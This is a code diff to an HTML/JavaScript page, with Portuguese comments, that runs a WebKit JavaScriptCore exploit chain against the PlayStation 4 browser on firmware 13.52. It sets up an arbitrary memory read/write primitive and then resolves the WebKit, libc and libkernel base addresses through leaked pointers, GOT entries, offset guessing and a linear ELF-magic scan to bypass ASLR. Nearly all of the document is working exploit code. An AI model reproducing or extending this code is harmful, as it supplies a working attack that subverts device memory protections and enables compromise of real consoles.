@@ -4,14 +4,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 13.52  Base Resolver</title>
+<title>PS4 13.52 Base Resolver 222</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
   min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
-h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
-#fw{font-size:11px;color:#444;margin-bottom:16px}
-#con{width:100%;max-width:720px;height:420px;background:#050508;border:1px solid #1a1d2e;
+h1{font-size:16px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
+#fw{font-size:11px;color:#555;margin-bottom:16px}
+#con{width:100%;max-width:700px;height:400px;background:#050508;border:1px solid #1a1d2e;
   border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.6}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
 .e{color:#ff5252;font-weight:bold}.s{color:#00c8ff;border-top:1px solid #1a1d2e;
@@ -19,16 +19,15 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;marg
 </style>
 </head>
 <body>
-<h1>PS4 13.52 — Base Resolver</h1>
+<h1>PS4 13.52 Base Resolver</h1>
 <div id="fw">detectando...</div>
 <div id="con"></div>
 
-<script src="./13.52.js?v=1"></script>
-
+<script src="./13.52.js?v=6"></script>
 <script type="module">
-import { int64 }              from './resources/int64.js';
+import { int64 } from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }     from './resources/mem.js';
+import { installWindowP } from './resources/mem.js';
 globalThis.int64 = int64;
 
 const $con = document.getElementById('con');
@@ -43,6 +42,7 @@ function log(m, c='i') {
 }
 function logH(m) { log('=== ' + m + ' ===', 's'); }
 
+// ── compat aliases ──
 function fixApi(p) {
   if (!p.read4 && p.read32) p.read4 = p.read32;
   if (!p.read8 && p.read64) p.read8 = p.read64;
@@ -51,11 +51,11 @@ function fixApi(p) {
   return p;
 }
 
-// ── resolve WebKit base com validação ──
-function resolveWebkitBase(p) {
+// ── resolve WebKit base from __ps5NativeCtor ──
+function resolveWebkitBase() {
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    throw new Error('__ps5NativeCtor invalido: ' + ctor);
+    throw new Error('__ps5NativeCtor inválido: ' + ctor);
   }
   const hi = Math.floor(ctor / 0x100000000);
   const lo = ctor - hi * 0x100000000;
@@ -64,84 +64,86 @@ function resolveWebkitBase(p) {
   const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
              ? OFFSET_wk_host_constructor_candidates[0] : 0x36F9E20;
 
+  const baseVal = ctor - hc;
+  const bHi = Math.floor(baseVal / 0x100000000);
+  const bLo = baseVal - bHi * 0x100000000;
+  const webkitBase = new int64(bLo >>> 0, bHi >>> 0);
+
   log('[+] __ps5NativeCtor = 0x' + ctor64.toString(16));
-  log('[+] host_constructor offset = 0x' + hc.toString(16));
+  log('[+] WebKit Base     = 0x' + webkitBase.toString(16) + ' (hc=0x' + hc.toString(16) + ')');
+  return webkitBase;
+}
 
-  // Método 1: offset padrão
-  let baseVal = ctor - hc;
-  let bHi = Math.floor(baseVal / 0x100000000);
-  let bLo = baseVal - bHi * 0x100000000;
-  let base = new int64(bLo >>> 0, bHi >>> 0);
-
-  log('[*] Tentando base = ctor - 0x' + hc.toString(16) + ' = 0x' + base.toString(16));
-
+// ── validar e corrigir WebKit base ──
+function validateAndFixWebkitBase(p, webkitBase) {
   try {
-    let magic = p.read4(base);
-    log('    read4(base) = 0x' + magic.toString(16));
+    const magic = p.read4(webkitBase);
+    log('    read4(webkitBase) = 0x' + magic.toString(16));
     if (magic === 0x464C457F) {
-      log('[✓] ELF magic OK no método 1', 'ok');
-      return base;
+      log('[✓] WebKit base validada (ELF magic OK)', 'ok');
+      return webkitBase;
     }
-  } catch(e) {
-    log('    read4(base) crashou: ' + (e.message || e), 'w');
+  } catch (e) {
+    log('    read4(webkitBase) crashou: ' + (e.message || e), 'w');
   }
 
-  // Método 2: variações de offset comuns
-  log('[*] Método 1 falhou. Tentando variações de offset...', 'w');
-  var variations = [
+  log('[!] Offset padrão falhou. Tentando variações...', 'w');
+
+  const ctor = globalThis.__ps5NativeCtor;
+  const variations = [
     0x3700000, 0x3800000, 0x4000000, 0x4500000,
     0x5000000, 0x5500000, 0x6000000, 0x7000000
   ];
 
-  for (var i = 0; i < variations.length; i++) {
-    var off = variations[i];
-    baseVal = ctor - off;
-    bHi = Math.floor(baseVal / 0x100000000);
-    bLo = baseVal - bHi * 0x100000000;
-    base = new int64(bLo >>> 0, bHi >>> 0);
+  for (let i = 0; i < variations.length; i++) {
+    const off = variations[i];
+    const baseVal = ctor - off;
+    const bHi = Math.floor(baseVal / 0x100000000);
+    const bLo = baseVal - bHi * 0x100000000;
+    const base = new int64(bLo >>> 0, bHi >>> 0);
     try {
-      let magic = p.read4(base);
-      log('    ctor - 0x' + off.toString(16) + ' = 0x' + base.toString(16) + ' -> magic=0x' + magic.toString(16));
+      const magic = p.read4(base);
       if (magic === 0x464C457F) {
-        log('[✓] ELF magic OK com offset 0x' + off.toString(16), 'ok');
+        log('[✓] ELF magic OK com offset 0x' + off.toString(16) + ' → base=0x' + base.toString(16), 'ok');
         return base;
       }
-    } catch(e) {}
+    } catch (e) {}
   }
 
-  // Método 3: scan linear
-  log('[*] Variações falharam. Scanning desde ctor...', 'w');
-  for (var back = 0; back < 0x10000000; back += 0x1000) {
+  log('[!] Variações falharam. Scanning linear...', 'w');
+  for (let back = 0; back < 0x10000000; back += 0x1000) {
     try {
-      baseVal = ctor - back;
-      bHi = Math.floor(baseVal / 0x100000000);
-      bLo = baseVal - bHi * 0x100000000;
-      base = new int64(bLo >>> 0, bHi >>> 0);
-      let magic = p.read4(base);
+      const baseVal = ctor - back;
+      const bHi = Math.floor(baseVal / 0x100000000);
+      const bLo = baseVal - bHi * 0x100000000;
+      const base = new int64(bLo >>> 0, bHi >>> 0);
+      const magic = p.read4(base);
       if (magic === 0x464C457F) {
-        log('[✓] ELF magic OK @ back=0x' + back.toString(16), 'ok');
+        log('[✓] ELF magic OK @ back=0x' + back.toString(16) + ' → base=0x' + base.toString(16), 'ok');
         return base;
       }
-    } catch(e) {}
+    } catch (e) {}
   }
 
   throw new Error('Não encontrou WebKit base válida');
 }
 
-// ── resolve libc ──
+// ── resolve libc via GOT memset ──
 function resolveLibc(p, webkitBase) {
   if (!OFFSET_wk_memset_import || !OFFSET_lc_memset) {
     log('[-] OFFSET_wk_memset_import ou OFFSET_lc_memset é 0', 'w');
     return null;
   }
   try {
-    var slot = webkitBase.add32(OFFSET_wk_memset_import);
-    var ptr  = p.read8(slot);
-    var libcBase = ptr.sub32(OFFSET_lc_memset);
+    const slot = webkitBase.add32(OFFSET_wk_memset_import);
+    const ptr  = p.read8(slot);
+    const libcBase = ptr.sub32(OFFSET_lc_memset);
+
     log('[+] GOT memset slot  = wk+0x' + OFFSET_wk_memset_import.toString(16));
     log('[+] GOT memset value   = 0x' + ptr.toString(16));
     log('[+] libcBase           = 0x' + libcBase.toString(16));
-    var magic = p.read4(libcBase);
+
+    const magic = p.read4(libcBase);
     if (magic !== 0x464C457F) {
       log('[-] libcBase ELF magic inválido: 0x' + magic.toString(16), 'e');
       return null;
@@ -150,7 +152,7 @@ function resolveLibc(p, webkitBase) {
       log('[-] libcBase não page-aligned', 'e');
       return null;
     }
-    log('[✓] libcBase validado', 'ok');
+    log('[✓] libcBase validado (ELF + aligned)', 'ok');
     return libcBase;
   } catch (e) {
     log('[-] Falha libc: ' + (e.message || e), 'e');
@@ -158,20 +160,22 @@ function resolveLibc(p, webkitBase) {
   }
 }
 
-// ── resolve libkernel ──
+// ── resolve libkernel via GOT __stack_chk_guard ──
 function resolveLibkernel(p, webkitBase) {
   if (!OFFSET_wk___stack_chk_guard_import || !OFFSET_lk___stack_chk_guard) {
     log('[-] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard é 0', 'w');
     return null;
   }
   try {
-    var slot = webkitBase.add32(OFFSET_wk___stack_chk_guard_import);
-    var ptr  = p.read8(slot);
-    var lkBase = ptr.sub32(OFFSET_lk___stack_chk_guard);
+    const slot = webkitBase.add32(OFFSET_wk___stack_chk_guard_import);
+    const ptr  = p.read8(slot);
+    const lkBase = ptr.sub32(OFFSET_lk___stack_chk_guard);
+
     log('[+] GOT guard slot   = wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16));
     log('[+] GOT guard value  = 0x' + ptr.toString(16));
     log('[+] libkernelBase    = 0x' + lkBase.toString(16));
-    var magic = p.read4(lkBase);
+
+    const magic = p.read4(lkBase);
     if (magic !== 0x464C457F) {
       log('[-] libkernelBase ELF magic inválido: 0x' + magic.toString(16), 'e');
       return null;
@@ -180,7 +184,7 @@ function resolveLibkernel(p, webkitBase) {
       log('[-] libkernelBase não page-aligned', 'e');
       return null;
     }
-    log('[✓] libkernelBase validado', 'ok');
+    log('[✓] libkernelBase validado (ELF + aligned)', 'ok');
     return lkBase;
   } catch (e) {
     log('[-] Falha libkernel: ' + (e.message || e), 'e');
@@ -190,13 +194,13 @@ function resolveLibkernel(p, webkitBase) {
 
 // ── main ──
 async function main() {
-  var ua = navigator.userAgent;
-  var fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
-  $fw.textContent = fw ? 'PS4 firmware ' + fw[1] : ua.slice(0, 50);
+  const ua = navigator.userAgent;
+  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
+  $fw.textContent = fw ? `PS4 firmware ${fw[1]}` : ua.slice(0, 50);
   log('UA: ' + ua, 'd');
 
   logH('STAGE 1: EXPLOIT JSC');
-  var carrier;
+  let carrier;
   try {
     carrier = await establishPrimitive({ maxAttempts: 0 });
   } catch (err) {
@@ -206,7 +210,7 @@ async function main() {
   log('[+] core.js OK', 'ok');
 
   logH('STAGE 2: R/W PRIMITIVE');
-  var p;
+  let p;
   try {
     p = installWindowP(carrier, { promote: true });
     p = fixApi(p);
@@ -217,16 +221,17 @@ async function main() {
   log('[+] mem.js OK — window.p instalado', 'ok');
 
   logH('STAGE 3: RESOLVENDO BASES');
-  var webkitBase;
+  let webkitBase;
   try {
-    webkitBase = resolveWebkitBase(p);
+    webkitBase = resolveWebkitBase();
+    webkitBase = validateAndFixWebkitBase(p, webkitBase);
   } catch (e) {
     log('[-] ' + e.message, 'e');
     return;
   }
 
-  var libcBase = resolveLibc(p, webkitBase);
-  var lkBase   = resolveLibkernel(p, webkitBase);
+  const libcBase = resolveLibc(p, webkitBase);
+  const lkBase   = resolveLibkernel(p, webkitBase);
 
   logH('RESULTADO');
   log('WebKit Base     = 0x' + webkitBase.toString(16));
